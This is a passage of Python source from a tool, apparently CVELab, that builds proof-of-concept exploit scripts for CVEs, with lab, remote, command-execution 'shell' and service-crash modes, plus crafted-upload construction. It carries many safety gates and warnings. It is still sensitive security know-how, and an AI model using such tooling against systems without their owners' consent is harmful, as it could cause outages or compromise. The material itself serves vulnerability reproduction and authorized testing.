    cannot give different answers -- the discipline `poc_standing` already
    holds remote mode to. Three conditions, and the third is read out of the
    validator rather than taken on trust from the contract that asked for it.
    """
    if service_port(plan or {}) is None:
        return False, (
            "this lab declares no service port, so there is no address to point a "
            "prompt at: its validator reads no argument at all."
        )
    if not _executes(plan):
        contract = (plan or {}).get("exploit_contract")
        contract = contract if isinstance(contract, dict) else {}
        declared = str(contract.get("evidence_type") or "").strip()
        return False, (
            f"this lab's declared evidence is {declared or 'not stated'} rather than "
            "code_execution, so a command has nothing to mean here and the lab "
            "program takes none."
        )
    if not _reads_a_second_positional(validator):
        return False, (
            "this lab's validator takes an address and no command. The generation "
            "contract asks for a command as a second argument wherever the evidence "
            "is code execution, in prose and with no check behind it, and this lab's "
            "answer did not implement it -- so there is no one-command form here to "
            "run at a prompt, and a prompt that sent lines to this program would "
            "have every one of them refused."
        )
    return True, ""


def _shell_block(plan: dict[str, Any] | None) -> str:
    """The prompt's own code, with this lab's words about this lab in it."""
    return (
        _POC_SHELL
        .replace("@@NOT_ALLOWED@@", _python_text(_filled(_SHELL_NOT_ALLOWED, width=76)))
        .replace(
            "@@ONE_COMMAND@@",
            _python_text(_filled(_SHELL_IS_NOT_ONE_COMMAND, width=76)),
        )
        .replace(
            "@@ADDRESS_FLAG@@",
            _python_text(_filled(_SHELL_IS_THE_ADDRESS_FLAG, width=76)),
        )
        .replace("@@OPENING@@", _python_text(_shell_opening(plan)))
    )


#: The modes that are CVELab's own rather than either program's: the name
#: `emit_poc` asks for, the predicate that spots it in argv, and the function
#: that takes the run. One entry today. A second mode is a second line here
#: and a second block above it, and the dispatch below does not change.
_POC_OWN_MODES = (("shell", "_shell_given", "_shell_mode"),)


def _poc_entry(standing: str, lab_address: bool, modes: tuple[str, ...] = ()) -> str:
    """The lines that choose which of the file's two programs runs.

    The only code in the artifact belonging to neither of them, and it reads
    argv itself rather than letting argparse have it: lab mode is what
    automatic validation runs, and the lab program takes its instructions from
    the environment, not from a command line. With no argument at all nothing
    here does anything and the lab program's own
    `if __name__ == "__main__"` starts it, which is how that mode stays what
    it was. `--lab-address` falls through to the same program with the address
    where it reads it. Remote mode, or its refusal, raises SystemExit here, so
    the lab half below is never reached.

    `modes` names the modes of CVELab's own that take the whole run instead
    of either program: each is one `if` that raises, checked before anything
    else reads argv, so a mode joins `_POC_OWN_MODES` rather than this
    dispatch. None of them can be reached with no argument at all, which is
    what keeps that path what it was.
    """
    lines = ['\nif __name__ == "__main__":']
    for mode, given, enter in _POC_OWN_MODES:
        if mode in modes:
            lines.append(f"    if {given}(sys.argv):")
            lines.append(f"        raise SystemExit({enter}(sys.argv))")
    if lab_address:
        lines.append("    if _lab_address_given(sys.argv):")
        lines.append("        sys.argv = _lab_address(sys.argv)")
        lines.append("    elif len(sys.argv) > 1:")
    else:
        lines.append("    if len(sys.argv) > 1:")
    if standing == POC_SHIPPED:
        lines.append("        sys.exit(main())")
    else:
        # The header is this file's handover document, so --help prints it
        # rather than the refusal: a lab with no remote mode still has a
        # header worth reading, and three labs in four are that lab.
        lines.append('        if sys.argv[1] in ("-h", "--help"):')
        lines.append("            print(__doc__)")
        lines.append("            raise SystemExit(0)")
        lines.append("        sys.stderr.write(REMOTE_MODE_REFUSED)")
        lines.append("        raise SystemExit(2)")
    return "\n".join(lines) + "\n"

#: Where the lab's own program starts, and what `poc_record` and the tests cut
#: the file on.
#:
#: Everything above it is CVELab's. Everything below is this lab's validator,
#: byte for byte, so `diff` against validator/validator.py is the check that
#: lab mode was not touched -- which is the whole of condition 1: a regression
#: there breaks validation rather than a deliverable.
POC_LAB_MODE_MARKER = (
    "# ---------------------------------------------------------------------------\n"
    "# LAB MODE: this lab's own validator from here down, byte for byte.\n"
    "# ---------------------------------------------------------------------------\n"
)


def _poc_facts(
    cve: str, spec: dict[str, Any] | None, plan: dict[str, Any] | None
) -> str:
    """The header an operator reads before running it.

    The shape a published single-file PoC has: what it is, what it affects,
    how it decides, and what it was tested against. The versions come from
    the lab, which installed them, so a reader can tell at a glance whether
    the host in front of them is even in range.

    `spec` is None for a lab with no remote mode. The project, the versions
    and the fix are facts about the weakness and stay; Transport, Strategy,
    Needs and Tested are facts about a run against one instance, and there
    was none, so claiming them would be the dishonesty this file was merged
    to end.
    """
    lines: list[str] = []
    plan = plan or {}
    for release in (plan.get("published_releases") or [])[:4]:
        if not isinstance(release, dict):
            continue
        package = str(release.get("package") or "").strip()
        affected = str(release.get("last_vulnerable") or "").strip()
        fixed = str(release.get("first_patched") or "").strip()
        if package and affected and fixed:
            lines.append(
                f"Affected      : {package} <= {affected} "
                f"({release.get('ecosystem') or 'package'}), fixed in {fixed}"
            )
    repository = str(plan.get("repository") or "").strip()
    if repository:
        lines.append(f"Project       : {repository}")
    revisions = plan.get("revisions")
    if isinstance(revisions, dict) and revisions.get("patched"):
        lines.append(f"Fix commit    : {revisions['patched']}")
    lab_type = str(plan.get("lab_type") or "").strip()
    if lab_type:
        lines.append(
            f"Lab           : {lab_type}, scenario {plan.get('scenario', 'default')}"
        )
    if spec is None:
        return "\n".join(lines) + "\n"
    transport = spec.get("transport", "http")
    lines.append(f"Transport     : {transport}")
    lines.append(f"Strategy      : {spec['strategy']}")
    if spec.get("inputs"):
        lines.append(
            "Needs         : " + ", ".join(
                f"--input {name}=..." for name in spec["inputs"]
            )
        )
    lines.append(
        "Tested        : proven by CVELab against a build of this project before and "
        "after the fix;"
    )
    lines.append(
        "                it showed the effect on the first and stayed silent on the second."
    )
    return "\n".join(lines) + "\n"


#: What this one script does to the target, rather than what the tool can do.
_FOOTPRINTS = {
    "direct_observation":
        "This run only reads: it sends the requests the weakness allows and reports what\n"
        "came back. It leaves nothing behind.\n",
    "inband_differential":
        "This run only reads: it asks for the same resource the way the weakness allows\n"
        "and the way that authorizes correctly, and reports what only the first returned.\n"
        "It leaves nothing behind.\n",
    "marker_roundtrip":
        "This run sends one inert random marker, cvelab-<16 hex>, through the vulnerable\n"
        "vector, because a reflection or storage bug cannot be shown without sending\n"
        "something. Where the vector stores what it is given, that marker stays until\n"
        "someone removes it; this script does not remove it, so tell the owner.\n",
    "oob_callback":
        "This run sends a payload naming a listener this script starts, and waits for the\n"
        "target to reach it. Whatever the payload is stored in keeps pointing at that\n"
        "address after the run; tell the owner and clean it up.\n",
    # The one footprint that is an outage. Said at the top of the file, in
    # the --help text and again as a refusal if --allow-disruption is not
    # passed, because an operator who learns this from the output has already
    # taken the service down.
    "service_crash":
        "This run STOPS THE SERVICE. It sends one ordinary request to show the instance\n"
        "is answering, then the input that kills it, then the first request again to show\n"
        "it is not answering any more. That is the finding, and it means an outage until\n"
        "someone restarts the service -- this script does not restart it. It refuses to\n"
        "run at all without --allow-disruption. Do not point it at anything shared or in\n"
        "production, and have the owner's agreement before you do.\n",
    "timing_differential":
        "This run only reads, and sends each request several times: the input that stalls\n"
        "the service and an ordinary one of the same shape, alternating, comparing how\n"
        "long each took. It leaves nothing behind, but the stalling requests occupy the\n"
        "service while they run, so a small instance will be slow for other callers\n"
        "during the run.\n",
}

#: A session that authenticates leaves more than a request does, and the
#: operator should know before they run it, not after.
_SESSION_FOOTPRINT = (
    "It authenticates with the values you pass as --input, so those credentials travel\n"
    "to the target and its logs will show the session. Over ssh the commands in SPEC\n"
    "run as that account and nothing else does; read them before you run this.\n"
)


#: Said when any request in the spec uploads something. "This run only
#: reads" would otherwise be printed above a request that writes a file to
#: the target, which is the opposite of what the operator needs to know.
_UPLOAD_FOOTPRINT = (
    "This run uploads a file the weakness is about. Where the target keeps what it is\n"
    "given, that file stays until someone removes it; this script does not remove it,\n"
    "so tell the owner what it is called and have it cleaned up.\n"
)


def _poc_footprint(spec: dict[str, Any]) -> str:
    text = _FOOTPRINTS[spec["strategy"]]
    if _uploads(spec):
        text += "\n" + _UPLOAD_FOOTPRINT
    if spec.get("transport") in HANDSHAKE_TRANSPORTS:
        text += "\n" + _SESSION_FOOTPRINT
    return text


def _poc_usage(spec: dict[str, Any], filename: str) -> str:
    """The invocations that actually work for this spec's strategy.

    A service_crash script refuses every command line without
    --allow-disruption, so showing the bare form first would put an example
    at the top of the file that cannot run. Every input the spec declares is
    on every line for the same reason: the script refuses to start without
    them, and the form without them was printed for most labs, a library's
    own route being declared as an input.
    """
    needs = "".join(
        f" \\\n        --input {name}=..." for name in spec.get("inputs") or ()
    )
    if spec["strategy"] == "service_crash":
        return (
            f"    python3 {filename} 10.0.0.5:8080 --allow-disruption{needs}\n"
            f"    python3 {filename} https://app.example.com --allow-disruption"
            f" --insecure{needs}\n"
            "\nWithout --allow-disruption it does nothing: the payload is expected to stop\n"
            "the service, so the acknowledgement is required rather than assumed.\n"
        )
    return (
        f"    python3 {filename} 10.0.0.5:8080 --show-bodies{needs}\n"
        f"    python3 {filename} https://app.example.com --insecure{needs}\n"
    )


def _uploads(spec: dict[str, Any]) -> bool:
    """Whether any request the script sends carries an upload."""
    for check in spec.get("checks") or []:
        for key in ("probe", "control", "observe", "baseline"):
            if any(request.get("upload") for request in check.get(key) or []):
                return True
        for step in check.get("discover") or []:
            if any(request.get("upload") for request in step.get("query") or []):
                return True
    return False


def emit_field_poc(
    cve: str, spec: dict[str, Any], plan: dict[str, Any] | None = None,
    filename: str = POC_NAME, epilog: str = '""',
) -> str:
    """Remote mode, with the spec frozen into it.

    The fixture and the setup are dropped: they put CVELab's own validation
    instance into the state the effect needs, and have no place in a script
    pointed at a server that already holds real data -- which is the whole
    reason the lab had to seed anything. They would also ship the seeding
    route's own path and the ids it creates inside the deliverable. That is
    also why the proved spec is recorded in report.json rather than in this
    half of the file: the record has to keep the setup for the next run to
    reuse, and this half must not carry it.

    What comes back is one half of `PoC.py` and not a file: no shebang, no
    docstring and no entry point. `emit_poc` is what assembles the artifact.

    `epilog` is the name of a constant in the other half, or `""`. It is what
    `--help` prints under the options, and for a lab that has one that is the
    `--lab-address` paragraph -- a flag handled before argparse is reached, so
    its help is text here rather than an option nothing reads.
    """
    embedded = {
        key: value for key, value in spec.items() if key not in ("fixture", "setup")
    }
    text = json.dumps(embedded, indent=4)
    # The spec sits inside a triple-quoted raw string so a reviewer reads it
    # indented. JSON escapes every quote inside a string, so three in a row
    # cannot occur and the text always ends in a brace -- but the script is a
    # deliverable, so the invariant is checked rather than assumed.
    if '"""' in text or text.endswith("\\"):
        raise ValueError("the spec cannot be embedded verbatim in the deliverable")
    # The effect and the file name used to be substituted here, into the
    # docstring and the usage lines this half no longer carries, and a guard
    # above refused a spec whose observable_effect held a triple quote. Both
    # went to `_poc_header`, where the effect goes through `_quotable` --
    # which turns three double quotes into three single ones rather than
    # raising, since raising here now fails the whole deliverables pass
    # instead of one artifact. 0 of 272 archived specs would have triggered
    # it; the one in the JSON above stays, because that text is the spec the
    # script sends and must be exact.
    return (
        _FIELD_POC
        .replace("@@SPEC@@", text)
        .replace("@@EPILOG@@", epilog)
        .replace("@@CVE@@", cve)
    )


#: The four answers a lab can give to "may this be pointed at a live instance",
#: as one function so that the script and the document beside it cannot give
#: different ones. They were two files written by two modules, which is how a
#: lab came to ship a document about a script that was never there.
POC_SHIPPED = "shipped"
POC_REFUSED = "refused"
POC_NOT_REQUESTED = "not_requested"
POC_NO_RECORD = "no_record"

#: The one reason core.run_lab writes itself rather than taking from the
#: drafter: the step was never asked for. Quoting it as a refusal would read
#: as a judgement the model made about the finding.
NOT_REQUESTED_REASON = "not requested"


def poc_standing(record: dict[str, Any] | None) -> str:
    """Which of the four states this lab's remote mode is in.

    A record claiming `shipped` without a usable spec and port is read as no
    claim at all. The spec and the port are what remote mode is made of, and
    a half-written record used to mean the script was emitted from whatever
    the next draft happened to say.
    """
    if not isinstance(record, dict) or not record:
        return POC_NO_RECORD
    if (
        record.get("shipped") is True
        and isinstance(record.get("spec"), dict)
        and isinstance(record.get("container_port"), int)
    ):
        return POC_SHIPPED
    reason = str(record.get("reason") or "").strip()
    if not reason:
        return POC_NO_RECORD
    if reason == NOT_REQUESTED_REASON:
        return POC_NOT_REQUESTED
    return POC_REFUSED


def _python_text(text: str) -> str:
    """A block of prose as a Python expression, one literal per line.

    Used for the refusal, whose text is the drafter's own and is the one
    string in the artifact CVELab did not write. json.dumps escapes a quote,
    a backslash and a control character the way a Python literal does, so no
    reason can end the literal early and run as code.
    """
    lines = text.splitlines() or [""]
    return "".join(
        f"    {json.dumps(line + chr(10), ensure_ascii=True)}\n" for line in lines
    )


def _filled(text: str, width: int = 78) -> str:
    """One paragraph wrapped to the width the rest of the header is written at.

    Used where a sentence is assembled from a lab's own facts. The same
    sentences written out as literals had the substitution land mid-line and
    print a 95-column paragraph in the middle of a 78-column file.
    """
    return textwrap.fill(
        " ".join(text.split()), width=width, break_long_words=False,
        break_on_hyphens=False,
    )


def _wrapped(text: str, width: int = 70, indent: str = "    ") -> str:
    """A recorded reason as a block, however the drafter wrote it."""
    out: list[str] = []
    for paragraph in text.strip().splitlines():
        paragraph = paragraph.strip()
        if not paragraph:
            out.append("")
            continue
        out.extend(
            textwrap.wrap(
                paragraph, width=width, initial_indent=indent,
                subsequent_indent=indent, break_long_words=False,
                break_on_hyphens=False,
            ) or [indent.rstrip()]
        )
    return "\n".join(out)


def _quotable(text: str) -> str:
    """Prose fit to sit inside the artifact's own docstring.

    The docstring is a raw string, so a backslash in the drafter's reason is
    the backslash they wrote. Three double quotes would end it and leave the
    rest of the reason running as code, so they become three single ones --
    the one text in this file CVELab did not write is also the only one that
    could do that.
    """
    return text.replace('"""', "'''").rstrip("\\")


def _refusal_text(cve: str, record: dict[str, Any], standing: str) -> str:
    """What remote mode says when there is none, in the drafter's own words."""
    if standing == POC_REFUSED:
        return (
            _filled(
                f"{cve} has no remote mode. CVELab drafted a single-instance script "
                "for this finding, emitted it, ran it against this lab's own builds, "
                "could not prove it, and recorded why:"
            )
            + "\n\n"
            + _wrapped(str(record.get("reason") or ""))
            + "\n\n"
            + _filled(
                "That sentence is the limit of what this lab shows, and it is the one "
                "to repeat rather than implying the demonstration carries over to a "
                "server you did not build here."
            )
            + "\n"
        )
    if standing == POC_NOT_REQUESTED:
        return _filled(
            f"{cve} has no remote mode, because one was never asked for. `cvelab run "
            "--manual-poc`, or `cvelab manual` on a lab that has already "
            "validated, attempts one: it drafts a single-instance spec, proves the "
            "script it emits against both of this lab's builds, and keeps it only if "
            "the effect showed on one and not on the other."
        ) + "\n"
    return _filled(
        f"{cve} has no remote mode, and this run kept no record of an attempt either "
        'way. Read that as "not available" rather than "refused": a lab driven by '
        "its own curated runner never attempts one, and nothing above was proved "
        "past this lab's own builds."
    ) + "\n"


def _lab_mode_note(
    vulnerable_only: bool,
    lab_address: bool = False,
    executes: bool = False,
    shell: tuple[bool, str] | None = None,
    plan: dict[str, Any] | None = None,
) -> str:
    """Lab mode, said in full.

    It is the mode that is easy to mistake for the other one: the two scripts
    this file replaced opened with the identical heading, and only one of them
    could reach a live server.

    `--lab-address` is described here rather than as a third mode, because
    that is what it is: the same program, against a build of this lab, with
    the address it was published on. What makes it safe to offer at all is
    that it says so in the same breath.

    `shell` is `shell_standing`'s answer, and the prompt belongs in this
    paragraph for the same reason: it is that same program again, run once
    per line. Where the lab takes an address and declares command execution
    and the prompt is still absent, the reason is printed here -- that lab
    qualified in every way its contract states and the mode is missing
    anyway, which is a fact about the lab and not about this file. Where the
    lab was never a candidate, nothing is said: a paragraph about a mode that
    could not apply is noise in three artifacts out of four.
    """
    builds = "one Docker build" if vulnerable_only else "two Docker builds"
    services = "`vulnerable`" if vulnerable_only else "`vulnerable` and `patched`"
    note = (
        (
            "LAB MODE -- no argument, or --lab-address with this lab's own address:\n"
            if lab_address else "LAB MODE -- no argument at all:\n"
        )
        + "\n"
        f"    python3 {POC_NAME}\n"
        "\n"
        + _filled(
            "This is the program automatic validation runs. With no argument it "
            f"reaches this lab's own {builds} and nothing else, by Compose service "
            f"name -- {services} -- so there is no address in it and nothing to aim. "
            "`manual.sh exploit` and `manual.sh verify` drive this same code, through "
            "CVELAB_MANUAL_ACTION and CVELAB_TARGET. It shows the effect is real on a "
            "build CVELab made, and shows nothing about any other host."
        )
        + "\n"
    )
    if not lab_address:
        return note
    command = " id" if executes else ""
    prompt = ""
    if shell is not None and executes:
        offered, reason = shell
        if offered:
            prompt = (
                "\n"
                + f"    python3 {POC_NAME} --lab-address 127.0.0.1:32768 --shell --allow-shell\n"
                + "\n"
                + _filled(
                    "A prompt, and not a session. Every line you type is one more "
                    "run of the command above -- one command, through the same "
                    "weakness, its output printed -- so there is no persistent "
                    "environment, no interactive programs, no job control and no "
                    "signals, and `cd` is tracked by the prompt rather than on the "
                    "target. It asks for --allow-shell because it runs whatever you "
                    "type for as long as you keep typing, which is more than any "
                    "other mode here asks; without the flag nothing is sent. The "
                    "prompt says all of this again before the first line, together "
                    "with the sentences below."
                )
                + "\n\n"
                + _quotable(_shell_where_you_are(plan))
            )
        elif reason:
            prompt = (
                "\n"
                + _filled(
                    "There is no prompt in this file -- no mode where line after "
                    f"line is run against this build -- because {reason}"
                )
                + "\n"
            )
    return (
        note
        + "\n"
        + f"    python3 {POC_NAME} --lab-address 127.0.0.1:32768{command}\n"
        + "\n"
        + _filled(
            "The same lab program, against a build of this lab that is already "
            "running: the address is what `bash manual.sh address <build>` prints "
            "after `setup`."
            + (
                " A second argument is one command to run on that build, delivered "
                "through the same weakness the differential proved, whose output it "
                "prints -- which is how the impact is shown to someone watching."
                if executes else ""
            )
            + " It reaches a build CVELab made and shows nothing about any other "
            "host, so it demonstrates a reproduction you brought up yourself and "
            "nothing about anyone's server."
        )
        + "\n\n"
        + _filled(
            "The address has to be on loopback, because that is where this lab "
            "publishes, and an address that is not is refused. Which loopback port "
            "is this lab's is not something this file can check -- it asks Docker "
            "for nothing -- so pointing it at another service of your own is yours "
            "to answer for. For an instance that is not this lab's, there is remote "
            "mode: one address and no --lab-address."
        )
        + "\n"
        + prompt
    )


def _poc_header(
    cve: str,
    plan: dict[str, Any] | None,
    record: dict[str, Any],
    standing: str,
    *,
    lab_mode: bool = True,
    lab_address: bool = False,
    filename: str = POC_NAME,
    shell: tuple[bool, str] | None = None,
) -> str:
    """The merged docstring: both modes, and what each one is worth.

    One header for one artifact. `PoC.py` was `validator.py` with six lines
    on top saying it was "designed for the generated Docker lab, not remote
    targets", while the script that did take a target sat beside it under
    another name -- so the file named PoC made no claim and the claim was in
    a file nobody opened. Both claims are here now, and the remote one says
    whether it was proved.

    `shell` is `shell_standing`'s answer, passed in rather than worked out
    here: it is read from the lab's own validator, which this function is not
    given and `emit_poc` is.
    """
    plan = plan or {}
    vulnerable_only = plan.get("lab_type") == "VULNERABLE_ONLY_REPRODUCTION"
    spec = record.get("spec") if standing == POC_SHIPPED else None
    modes = (
        "\nTwo modes, and the argument chooses.\n\n"
        + _lab_mode_note(
            vulnerable_only, lab_address, _executes(plan), shell, plan
        )
        + "\n"
        if lab_mode else "\n"
    )
    if spec is None:
        title = f"{cve} - this lab's own reproduction; no remote mode"
        body = (
            "REMOTE MODE -- refused for this lab. Exit 2, and nothing is sent:\n"
            "\n"
            f"    python3 {filename} 10.0.0.5:8080\n"
            "\n"
            + _quotable(_refusal_text(cve, record, standing))
        )
    else:
        title = f"{cve} - {_quotable(spec['observable_effect'])}"
        body = _remote_mode_note(
            cve, spec, plan, int(record.get("container_port") or 0), filename
        )
    return (
        'r"""' + title + "\n\n"
        + _poc_facts(cve, spec, plan)
        + modes
        + body
        + '"""\n'
    )


#: The entry point of a PoC that has only the one mode. No argument is
#: argparse's error rather than a second mode, because there is no second
#: mode to fall through to.
_SOLE_MODE_DISPATCH = '''
if __name__ == "__main__":
    sys.exit(main())
'''


def emit_standalone_poc(
    cve: str,
    spec: dict[str, Any],
    plan: dict[str, Any] | None = None,
    port: int = 0,
    filename: str = "field-poc.py",
) -> str:
    """`cvelab field`'s artifact: remote mode, and no second mode.

    A closed-image field lab carries no validator of its own. Its proof is
    two published images, the script never runs against a Compose service
    name, and the whole deliverable is that one mode -- so the header offers
    no second one rather than describing a lab mode this artifact has not
    got.
    """
    header = _poc_header(
        cve, plan, {"shipped": True, "spec": spec, "container_port": port},
        POC_SHIPPED, lab_mode=False, filename=filename,
    )
    script = (
        "#!/usr/bin/env python3\n" + header + "\n"
        + emit_field_poc(cve, spec, plan, filename)
        + _SOLE_MODE_DISPATCH
    )
    compile(script, filename, "exec")
    return script


_FUTURE_IMPORT = re.compile(r"^from __future__ import ([^(\\\n]+)$", re.MULTILINE)


def _lab_half(validator: str) -> tuple[str, list[str]]:
    """The lab program as it sits in the merged file, and what it imported.

    A future statement has to precede every other statement in a file, and
    this file holds two programs, so one in the lower half is a SyntaxError
    that would reach the operator as a PoC that does not parse. 2 of 281
    archived validators carry one, both the plain one-line form, so the line
    is hoisted to the top and the line it came from says where it went.
    """
    names: list[str] = []

    def hoist(match: re.Match[str]) -> str:
        for name in match.group(1).split(","):
            name = name.strip()
            if name and name not in names:
                names.append(name)
        return f"# {match.group(0)}  # hoisted to the top of this merged file"

    text = _FUTURE_IMPORT.sub(hoist, validator)
    if re.search(r"^from __future__", text, re.MULTILINE):
        # Nothing in the archive reaches this, and a shipped script that does
        # not parse is worse than a lab whose deliverables failed loudly.
        raise ValueError(
            "this lab's validator carries a future import this merge cannot hoist; "
            "PoC.py would not parse"
        )
    return text if text.endswith("\n") else text + "\n", names


def emit_poc(
    cve: str,
    plan: dict[str, Any] | None,
    validator: str,
    record: dict[str, Any] | None = None,
) -> str:
    """The one artifact: lab mode, remote mode, and the standing of each.

    `validator` is this lab's own `validator/validator.py`, and it goes in
    last and unaltered. That is condition one: with no argument this file is
    the program automatic validation runs, down to the environment variables
    and the exit codes, so the lower half is checked by `diff` rather than by
    reading.

    `record` is what the drafter's attempt left behind -- `poc_record` reads
    it -- and it decides the upper half. A proved spec becomes remote mode. A
    refusal becomes a refusal that quotes the drafter, because a remote mode
    that looks available and was never proved is worse than two files: it is
    pressed at a client.
    """
    record = record if isinstance(record, dict) else {}
    standing = poc_standing(record)
    # Whether the lab program takes an address at all, which is what the
    # contract's declared port says: a lab without one is an archived lab
    # whose validator reads no argv, and `--lab-address` there would run the
    # differential and call it a demonstration.
    takes_address = service_port(plan or {}) is not None
    # And whether the prompt is one of this lab's modes, which is the same
    # question asked of the validator as well as of the contract: the
    # one-command form the prompt runs is asked for in prose and checked by
    # nothing, so a lab that did not write it gets no prompt and the reason
    # is printed in the header instead.
    shell = shell_standing(plan, validator)
    header = _poc_header(
        cve, plan, record, standing, lab_address=takes_address, shell=shell,
    )
    lab, futures = _lab_half(validator)
    hoisted = f"from __future__ import {', '.join(futures)}\n" if futures else ""
    if standing == POC_SHIPPED:
        remote = emit_field_poc(
            cve, record["spec"], plan, POC_NAME,
            epilog="LAB_ADDRESS_HELP" if takes_address else '""',
        )
    else:
        remote = _POC_NO_REMOTE_MODE.replace(
            "@@REFUSAL@@", _python_text(_refusal_text(cve, record, standing))
        )
    if takes_address:
        remote += "\n" + _lab_address_block(plan, shell=shell[0])
    if shell[0]:
        remote += "\n" + _shell_block(plan)
    remote += _poc_entry(
        standing, takes_address, ("shell",) if shell[0] else (),
    )
    upper = "#!/usr/bin/env python3\n" + header + hoisted + "\n" + remote + "\n"
    # Only the half CVELab wrote. The lower half is this lab's own validator
    # and may use syntax newer than the interpreter rendering the kit; the
    # upper half carries the embedded spec and the drafter's prose, which are
    # the two texts in the file that could end a string literal early.
    compile(upper, POC_NAME, "exec")
    return upper + POC_LAB_MODE_MARKER + lab


#: The seeding program this mode runs, and the other of the two.
#:
#: `steps.SETUP_RUNNER` is its counterpart and carries the measurement of how
#: alike they are and the five reasons they were left apart. The short of it:
#: the same five jobs, 15% of the same text, and each pinned by exact text in
#: its own quoting convention, so merging them is rewriting one of two
#: programs that a lab run is made of rather than lifting a shared one out.
#:
#: The difference this side owns is the multipart body below. Three labs that
#: reproduced were refused a script over a crafted upload -- an archive that
#: escapes its extraction root, a file whose name a filter should have
#: refused -- so a single-target spec can declare one and this builds it. A
#: generated lab's setup cannot, and is told so during generation rather than
#: here.
_SETUP_RUNNER = (
    "import base64, io, json, os, re, sys, tarfile, urllib.error, urllib.request\n"
    "import uuid, zipfile\n"
    "base = os.environ['CVELAB_BASE']\n"
    "given = json.loads(os.environ.get('CVELAB_INPUTS') or '{}')\n"
    "host = base.split('://', 1)[-1]\n"
    "given = dict(given, target=host, targetHost=host.rsplit(':', 1)[0])\n"
    "done, bound, cookies = [], {}, {}\n"
    "steps = json.loads(os.environ['CVELAB_SETUP'])\n"
    "for step in steps:\n"
    "  for request in (step['query'] if 'bind' in step else [step]):\n"
    "    text = json.dumps(request)\n"
    "    for name, value in dict(given, **bound).items():\n"
    "        text = text.replace('{{%s}}' % name, json.dumps(str(value))[1:-1])\n"
    "    request = json.loads(text)\n"
    "    body = request.get('body')\n"
    "    headers = dict(request.get('headers') or {})\n"
    "    if cookies:\n"
    "        headers.setdefault('Cookie', '; '.join(\n"
    "            '%s=%s' % pair for pair in sorted(cookies.items())))\n"
    "    data = None if body is None else str(body).encode()\n"
    "    if request.get('upload'):\n"
    "        boundary = 'cvelab' + uuid.uuid4().hex\n"
    "        chunks = []\n"
    "        for part in request['upload']:\n"
    "            head = '--%s\\r\\nContent-Disposition: form-data; name=\"%s\"' % (\n"
    "                boundary, part['name'])\n"
    "            if 'value' in part:\n"
    "                chunks.append((head + '\\r\\n\\r\\n' + part['value'] +\n"
    "                               '\\r\\n').encode())\n"
    "                continue\n"
    "            head += '; filename=\"%s\"\\r\\nContent-Type: %s\\r\\n\\r\\n' % (\n"
    "                part['filename'], part['content_type'])\n"
    "            kind = part['kind']\n"
    "            if kind == 'text':\n"
    "                raw = part['text'].encode()\n"
    "            elif kind == 'base64':\n"
    "                raw = base64.b64decode(part['base64'])\n"
    "            else:\n"
    "                held = io.BytesIO()\n"
    "                if kind == 'zip':\n"
    "                    with zipfile.ZipFile(held, 'w', zipfile.ZIP_DEFLATED) as archive:\n"
    "                        for name, text in part['zip'].items():\n"
    "                            archive.writestr(name, text)\n"
    "                else:\n"
    "                    with tarfile.open(fileobj=held, mode='w:gz') as archive:\n"
    "                        for name, text in part['tar_gz'].items():\n"
    "                            entry = tarfile.TarInfo(name)\n"
    "                            entry.size = len(text.encode())\n"
    "                            archive.addfile(entry, io.BytesIO(text.encode()))\n"
    "                raw = held.getvalue()\n"
    "            chunks.append(head.encode() + raw + b'\\r\\n')\n"
    "        chunks.append(('--%s--\\r\\n' % boundary).encode())\n"
    "        data = b''.join(chunks)\n"
    "        if not any(n.lower() == 'content-type' for n in headers):\n"
    "            headers['Content-Type'] = 'multipart/form-data; boundary=' + boundary\n"
    "    call = urllib.request.Request(\n"
    "        base + request['path'],\n"
    "        data=data,\n"
    "        headers=headers,\n"
    "        method=request.get('method', 'GET'))\n"
    "    try:\n"
    "        with urllib.request.urlopen(call, timeout=60) as answer:\n"
    "            status = answer.status\n"
    "            body_back = answer.read(1048576).decode('utf-8', 'replace')\n"
    # Held like status and body_back are: overwritten per request, read after
    # the inner loop, so the extractor sees the last request's response.
    "            headers_back = dict(answer.headers.items())\n"
    "            for header in answer.headers.get_all('Set-Cookie') or []:\n"
    "                pair = str(header).split(';', 1)[0].strip()\n"
    "                if '=' in pair:\n"
    "                    k, _, v = pair.partition('=')\n"
    "                    cookies[k.strip()] = v.strip()\n"
    "    except urllib.error.HTTPError as refused:\n"
    "        status = refused.code\n"
    "        body_back = refused.read(1048576).decode('utf-8', 'replace')\n"
    # A refusal is a response and carries headers, which is where a seeding
    # step's value can be: a 401 that still sets a CSRF token, a 403 naming
    # the tenant it wanted. HTTPError.headers can be None, hence the guard.
    "        headers_back = dict(refused.headers.items() if refused.headers else [])\n"
    "    except Exception as error:\n"
    "        print(json.dumps({'path': request['path'], 'error': str(error)[:300]}))\n"
    "        sys.exit(1)\n"
    "    done.append({'method': request.get('method', 'GET'),\n"
    "                 'path': request['path'], 'status': status})\n"
    "  if 'bind' in step:\n"
    "    taken = step['extract']\n"
    "    found = None\n"
    "    if 'regex' in taken:\n"
    "        hit = re.search(taken['regex'], body_back)\n"
    "        found = (hit.group(1) if hit and hit.groups() else\n"
    "                 hit.group(0) if hit else None)\n"
    "    elif 'json_values' in taken:\n"
    "        try:\n"
    "            held = json.loads(body_back)\n"
    "        except ValueError:\n"
    "            held = None\n"
    "        stack = [held]\n"
    "        while stack:\n"
    "            node = stack.pop(0)\n"
    "            if isinstance(node, dict):\n"
    "                if taken['json_values'] in node:\n"
    "                    found = node[taken['json_values']]\n"
    "                    break\n"
    "                stack.extend(node.values())\n"
    "            elif isinstance(node, list):\n"
    "                stack.extend(node)\n"
    # The validator has accepted all four extractors since header was added,
    # and this dispatch had three, so a spec declaring extract.header
    # validated clean and then died on 'nothing to bind from the response' --
    # a refusal that names the response rather than the gap in the runner.
    # Matched case-insensitively because a header name is: validate_extractor
    # only strips the name, so Location and location are the same header and
    # the in-process extractor (tokens, above) already compares them lowered.
    "    elif 'header' in taken:\n"
    "        want = taken['header'].lower()\n"
    "        found = next((value for name, value in headers_back.items()\n"
    "                      if name.lower() == want and str(value)), None)\n"
    "    elif 'status' in taken:\n"
    "        found = status\n"
    "    if found in (None, ''):\n"
    "        print(json.dumps({'bind': step['bind'],\n"
    "                          'error': 'nothing to bind from the response'}))\n"
    "        sys.exit(1)\n"
    "    bound[step['bind']] = str(found)\n"
    "print(json.dumps({'requests': done, 'bound': bound}))\n"
)


def _run_setup(
    container: str, port: int, requests: list[dict[str, Any]],
    image: str = sidecar.BASE_IMAGE, inputs: dict[str, str] | None = None,
    host: str = "127.0.0.1",
) -> dict[str, Any]:
    """Put one build into the state the effect needs, before the script runs.

    It runs from the same kind of sidecar as the script and over HTTP, which
